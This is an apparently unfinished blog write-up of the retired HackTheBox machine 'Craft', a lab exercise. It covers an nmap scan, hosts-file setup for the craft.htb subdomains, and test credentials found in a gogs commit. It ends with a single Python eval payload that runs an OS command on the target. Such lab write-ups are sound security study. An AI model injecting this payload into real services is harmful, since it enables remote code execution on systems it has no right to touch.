Title:HTB: Craft
Date: xx-xx-2020 11:25
category:security
tags:security, boot2root, HTB, git, gogs, api, flask
meta:security, boot2root, HTB, git, gogs, api, flask

<img class="align-left" src="/media/2020.xs/craft_card.png" alt="Craft card" width="262">


This is a writeup about a retired HacktheBox machine:
[Craft](https://www.hackthebox.eu/home/machines/profile/197)
This box is classified as a medium machine.

<!-- PELICAN_END_SUMMARY -->

[TOC]

# Recon

We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.

    :::text
    # Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110
    Nmap scan report for 10.10.10.110
    Host is up (0.15s latency).
    Not shown: 65532 closed ports
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
    443/tcp  open  ssl/http nginx 1.15.8
    6022/tcp open  ssh      (protocol 2.0)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port6022-TCP:V=7.80%I=7%D=11/8%Time=5DC57F7D%P=x86_64-pc-linux-gnu%r(NU
    SF:LL,C,"SSH-2\.0-Go\r\n");
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Nov  8 15:45:26 2019 -- 1 IP address (1 host up) scanned in 704.14 seconds
    # Web

# Web

The website present the Craft database for **beers**!

>Craft aims to be the largest repository of US-produced craft brews accessible
>over REST. In the future we will release a mobile app to interface with our
>public rest API as well as a brew submission process, but for now, check out our API!

There is also a link to a [gogs](https://gogs.io/) as well as the API. This
links redirect to some subdomain. Let us add some informations in our
`/etc/hosts`.


    :::text
    cat /etc/hosts
    127.0.0.1	localhost
    127.0.1.1	kalili
    10.10.10.110	craft.htb
    10.10.10.110	api.craft.htb
    10.10.10.110	gogs.craft.htb

On the gogs commit we can found the creed of an user used for testing purpose in
the commit `10e3ba4f0a09c778d7cec673f28d410b73455a86` in the file
`test/test.py`.



eval("__import__('os').system('whoami')>1")
